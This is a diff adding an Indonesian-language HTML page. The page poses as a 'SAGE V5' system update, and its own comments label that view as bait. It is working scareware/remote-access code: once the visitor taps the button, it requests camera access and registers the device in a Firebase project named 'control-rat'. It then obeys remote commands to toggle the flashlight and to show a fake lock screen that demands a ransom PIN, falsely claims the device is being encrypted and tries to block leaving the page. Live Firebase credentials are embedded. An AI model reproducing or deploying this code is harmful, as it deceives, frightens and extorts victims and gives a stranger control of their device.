@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>YOX SYSTEM UPDATE</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <style>
+        * { -webkit-user-select: none; user-select: none; -webkit-touch-callout: none; }
+        body { margin: 0; padding: 0; background: #000; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; overflow: hidden; }
+        
+        /* TAMPILAN AWAL (UMPAN) */
+        #setup { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; }
+        .cyber-box { border: 1px solid #00f2ff; padding: 40px; border-radius: 20px; background: rgba(0, 242, 255, 0.05); box-shadow: 0 0 20px rgba(0, 242, 255, 0.2); }
+        .btn-update { background: #00f2ff; color: #000; border: none; padding: 15px 40px; border-radius: 10px; font-weight: bold; cursor: pointer; margin-top: 20px; text-transform: uppercase; }
+
+        /* TAMPILAN RANSOMWARE (PERSIS SCREENSHOT 2) */
+        #ransom { display: none; background: radial-gradient(circle, #200000 0%, #000 70%); height: 100vh; text-align: center; padding: 20px; border-left: 2px solid #8B0000; border-right: 2px solid #8B0000; box-sizing: border-box; }
+        h2 { color: #DC143C; text-shadow: 0 0 15px #DC143C; letter-spacing: 3px; margin-top: 10px; }
+        .lock-icon { font-size: 60px; color: #FFD700; margin-bottom: 10px; }
+        .message-box { background: rgba(220, 20, 60, 0.05); border: 2px solid #8B0000; padding: 20px; border-radius: 15px; margin: 25px 0; text-align: left; }
+        .message-text { color: #fff; font-size: 14px; font-weight: bold; line-height: 1.5; }
+        .input-box { background: #000; border: 2px solid #8B0000; padding: 15px; border-radius: 15px; margin-bottom: 25px; }
+        .input-text { color: #fff; font-size: 20px; letter-spacing: 10px; font-weight: bold; }
+        .btn-unlock { background: #8B0000; color: #fff; border: none; padding: 18px; border-radius: 50px; width: 100%; font-weight: bold; letter-spacing: 2px; cursor: pointer; box-shadow: 0 5px 15px rgba(139, 0, 0, 0.4); }
+    </style>
+</head>
+<body onload="checkStatus()">
+
+    <div id="setup">
+        <div class="cyber-box">
+            <h1 style="color: #00f2ff; letter-spacing: 5px;">SAGE V5</h1>
+            <p style="color: #ccc;">Checking System Compatibility...</p>
+            <button class="btn-update" onclick="initSAGE()">Update System</button>
+        </div>
+    </div>
+
+    <div id="ransom">
+        <div class="lock-icon">🔒</div>
+        <h2>KUNCI PERANGKAT</h2>
+        <div style="border-bottom: 1px dashed rgba(220, 20, 60, 0.3); margin: 15px 0;"></div>
+        
+        <div style="font-size: 10px; text-transform: uppercase; color: #C0C0C0; text-align: left; margin-bottom: 5px;">PESAN / KATA RAHASIA</div>
+        <div class="message-box">
+            <p id="ransomMsg" class="message-text">TERKUNCI KAN HP LU WKWK PANIK GK BOS?</p>
+        </div>
+        
+        <div style="font-size: 10px; text-transform: uppercase; color: #C0C0C0; text-align: left; margin-bottom: 5px;">PIN PENGUNCI (DIGIT)</div>
+        <div class="input-box">
+            <div class="input-text">****</div>
+        </div>
+        
+        <button class="btn-unlock" onclick="unlockProcess()">🔐 KUNCI PERANGKAT</button>
+    </div>
+
+    <script>
+        // CONFIG FIREBASE LO (CONTROL-RAT)
+        const firebaseConfig = {
+            apiKey: "AIzaSyBfeY-xJ4TQWrQq8IZwwsigP9jwPpstThk",
+            authDomain: "control-rat.firebaseapp.com",
+            databaseURL: "https://control-rat-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "control-rat",
+            storageBucket: "control-rat.firebasestorage.app",
+            messagingSenderId: "181283651682",
+            appId: "1:181283651682:web:42a169e6daaad00f7e513b"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        
+        // Buat ID Target Berdasarkan Device
+        const targetId = "SAGE_" + navigator.platform.replace(/\s/g, '_') + "_" + Math.floor(Math.random() * 999);
+        let currentPin = "7777";
+
+        async function initSAGE() {
+            document.querySelector('.cyber-box').innerHTML = "<h1>OPTIMIZING...</h1><p>Please do not close this tab.</p>";
+            
+            try {
+                // 1. BYPASS SENTER BELAKANG
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                const track = stream.getVideoTracks()[0];
+
+                // 2. DAFTAR KE DATABASE ONLINE
+                db.ref('targets/' + targetId).set({
+                    model: navigator.userAgent.split('(')[1].split(')')[0],
+                    status: "Online",
+                    lastSeen: Date.now()
+                });
+                db.ref('targets/' + targetId).onDisconnect().update({ status: "Offline" });
+
+                // 3. LISTEN PERINTAH DARI DASHBOARD
+                db.ref('commands/' + targetId).on('value', (snapshot) => {
+                    const cmd = snapshot.val();
+                    if (!cmd) return;
+
+                    // Fitur Senter
+                    if (cmd.type === "flash") {
+                        track.applyConstraints({ advanced: [{ torch: (cmd.status === "on") }] });
+                    }
+
+                    // Fitur Lock (Real-Time PIN)
+                    if (cmd.type === "lock" && cmd.status === "on") {
+                        currentPin = cmd.pin || "7777";
+                        document.getElementById('ransomMsg').innerText = cmd.message;
+                        document.getElementById('setup').style.display = 'none';
+                        document.getElementById('ransom').style.display = 'block';
+                        navigator.vibrate([500, 200, 500]);
+                    }
+                });
+            } catch (e) {
+                alert("IZINKAN AKSES KAMERA UNTUK UPDATE!");
+                location.reload();
+            }
+        }
+
+        function unlockProcess() {
+            let userPin = prompt("MASUKKAN PIN TEBUSAN UNTUK MEMBUKA:");
+            if (userPin === currentPin) {
+                alert("🔓 PIN BENAR! UNLOCKING...");
+                db.ref('commands/' + targetId).update({ status: "off", type: "idle" });
+                location.reload();
+            } else if (userPin !== null) {
+                alert("❌ PIN SALAH! PERANGKAT TETAP TERKUNCI.");
+                navigator.vibrate(500);
+            }
+        }
+
+        function checkStatus() {
+            console.log("SAGE V5 Ready. Target ID: " + targetId);
+        }
+
+        // ANTI BACK/REFRESH PAS LAGI KEKUNCI
+        window.onbeforeunload = function() {
+            if(document.getElementById('ransom').style.display === 'block') {
+                return "PERANGKAT SEDANG DIENKRIPSI!";
+            }
+        };
+    </script>
+</body>
+</html>
